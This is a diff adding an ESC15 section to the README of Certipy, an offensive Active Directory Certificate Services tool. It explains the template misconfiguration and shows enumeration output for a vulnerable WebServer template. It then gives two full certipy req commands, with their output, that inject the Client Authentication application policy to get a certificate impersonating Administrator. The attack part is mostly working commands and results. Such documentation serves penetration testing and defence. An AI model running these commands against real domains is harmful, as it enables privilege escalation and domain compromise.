@@ -26,6 +26,7 @@ Certipy is an offensive tool for enumerating and abusing Active Directory Certif
       - [ESC8](#esc8)
       - [ESC9 & ESC10](#esc9--esc10)
       - [ESC11](#esc11)
+      - [ESC15](#esc15)
   - [Contact](#contact)
   - [Credits](#credits)
 
@@ -814,6 +815,91 @@ Certipy v4.7.0 - by Oliver Lyak (ly4k)
 [*] Saved certificate and private key to 'administrator.pfx'
 [*] Exiting...
 ```
+
+### ESC15
+
+ESC15 is when a certificate template has most of the primary conditions for ESC1, including:
+- The template permits low-privilege users to enroll.
+- The template permits the user to specify an arbitrary SAN.
+- The template is using Schema Version 1.
+
+However, the template does not have the 'Client Authentication' EKU. Example output of a vulnerable template would look like the following:
+
+```bash
+  6
+    Template Name                       : WebServer
+    Display Name                        : Web Server
+    Certificate Authorities             : CORP-DC-CA
+    Enabled                             : True
+    Client Authentication               : False
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : True
+    Certificate Name Flag               : EnrolleeSuppliesSubject
+    Enrollment Flag                     : None
+    Private Key Flag                    : AttestNone
+    Extended Key Usage                  : Server Authentication
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Validity Period                     : 2 years
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Template Schema Version             : 1
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : CORP.COM\Domain Users
+                                          CORP.COM\Domain Admins
+                                          CORP.COM\Enterprise Admins
+                                          CORP.COM\Authenticated Users
+      Object Control Permissions
+        Owner                           : CORP.COM\Enterprise Admins
+        Write Owner Principals          : CORP.COM\Domain Admins
+                                          CORP.COM\Enterprise Admins
+        Write Dacl Principals           : CORP.COM\Domain Admins
+                                          CORP.COM\Enterprise Admins
+        Write Property Principals       : CORP.COM\Domain Admins
+                                          CORP.COM\Enterprise Admins
+    [!] Vulnerabilities
+      ESC15                             : 'CORP.COM\\Domain Users' and 'CORP.COM\\Authenticated Users' can enroll, enrollee supplies subject and schema version is 1
+```
+
+We can supply arbitrary Application Policies by using the `--application-policies` parameter.
+
+```bash
+certipy req -ca CORP-DC-CA -target-ip 192.168.4.178 -u 'user@corp.com' -p 'Password1' -template "WebServer" -upn "Administrator@corp.com" --application-policies 'Client Authentication'
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[+] Trying to resolve 'CORP.COM' at '127.0.0.53'
+[+] Generating RSA key
+[*] Requesting certificate via RPC
+[+] Trying to connect to endpoint: ncacn_np:192.168.4.178[\pipe\cert]
+[+] Connected to endpoint: ncacn_np:192.168.4.178[\pipe\cert]
+[*] Successfully requested certificate
+[*] Request ID is 32
+[*] Got certificate with UPN 'Administrator@corp.com'
+[*] Certificate has no object SID
+[*] Saved certificate and private key to 'administrator.pfx'
+```
+
+You can also specify the Application Policy OID directly.
+
+```bash
+certipy req -ca CORP-DC-CA -target-ip 192.168.4.178 -u 'user@corp.com' -p 'Password1' -template "WebServer" -upn "Administrator@corp.com" --application-policies '1.3.6.1.5.5.7.3.2'
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[+] Trying to resolve 'CORP.COM' at '127.0.0.53'
+[+] Generating RSA key
+[*] Requesting certificate via RPC
+[+] Trying to connect to endpoint: ncacn_np:192.168.4.178[\pipe\cert]
+[+] Connected to endpoint: ncacn_np:192.168.4.178[\pipe\cert]
+[*] Successfully requested certificate
+[*] Request ID is 33
+[*] Got certificate with UPN 'Administrator@corp.com'
+[*] Certificate has no object SID
+[*] Saved certificate and private key to 'administrator.pfx'
+```
+
 
 ## Contact
 
